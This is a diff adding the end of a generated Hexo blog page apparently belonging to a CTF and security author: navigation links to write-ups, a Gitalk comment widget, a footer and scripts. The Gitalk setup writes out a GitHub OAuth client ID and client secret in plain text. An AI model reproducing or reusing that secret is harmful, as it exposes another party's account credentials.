+        <div class="article-nav-title">
+          
+            Black Watch入群题题解
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/03/10/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">高校战“疫”网络安全分享赛部分赛题复现</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b7d32ae2538e1a71f462',
+      clientSecret: 'da0452b610458a4ccbc38598fb0d02f0eb9e653d',
+      repo: 'gitalk',
+      owner: 'Mount4in',
+      admin: ['Mount4in'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 Mount4in</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Mount4in"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
